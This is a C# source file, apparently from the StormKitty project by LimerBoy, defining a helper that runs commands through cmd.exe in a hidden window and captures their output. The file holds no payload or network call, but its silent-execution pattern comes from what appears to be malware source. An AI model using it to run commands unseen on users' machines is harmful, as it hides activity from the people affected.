/* 
    Author : LimerBoy
    Github : github.com/LimerBoy/StormKitty
*/

using System.Diagnostics;

namespace StormKitty
{
    internal sealed class CommandHelper
    {
        public static string Run(string cmd, bool wait = true)
        {
            string output = "";
            using (var process = new Process())
            {
                process.StartInfo = new ProcessStartInfo
                {
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    FileName = "cmd.exe",
                    Arguments = cmd,
                    RedirectStandardError = true,
                    RedirectStandardOutput = true
                };
                process.Start();
                output = process.StandardOutput.ReadToEnd();
                if (wait) process.WaitForExit();
            }
            return output;
        }
    }
}
